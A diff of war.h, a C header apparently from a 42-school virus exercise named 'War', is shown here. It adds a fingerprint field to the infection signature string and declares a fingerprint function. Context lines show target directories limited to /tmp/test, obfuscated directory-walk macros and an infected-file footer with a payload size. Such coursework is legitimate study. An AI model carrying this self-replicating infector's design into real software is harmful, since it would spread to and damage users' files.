@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   war.h                                              :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
+/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/06/16 11:33:45 by pboucher          #+#    #+#             */
-/*   Updated: 2026/06/16 11:33:47 by pboucher         ###   ########.fr       */
+/*   Updated: 2026/06/20 09:50:24 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -24,7 +24,8 @@ typedef struct	s_exec_ctx
 	char	**envp;
 }	t_exec_ctx;
 
-#define SIGNATURE_STR "\0" "War version 1.0 (c)oded by mbatty-pboucher"
+#define SIGNATURE_STR "\0" "War version 1.0 (c)oded by mbatty-pboucher - 0000000000000000:0000000000000000"
+#define FINGERPRINT_START 46
 #define _WKq 		{"/tmp/test","/tmp/test2"}
 #define _DOT(x) 	(!(*(x)^0x2e)&!*((x)+1))
 #define _DDOT(x)	(!(*(x)^0x2e)&!(*(x+1)^0x2e)&!*(x+2))
@@ -44,6 +45,8 @@ typedef struct s_footer
 	char		signature[sizeof(SIGNATURE_STR)];
 	uint64_t	payload_size;
 }	t_footer;
+
+int	get_fingerprint(char *buf);
 
 #define FOOTER_MAGIC 0x4242424242424242
 
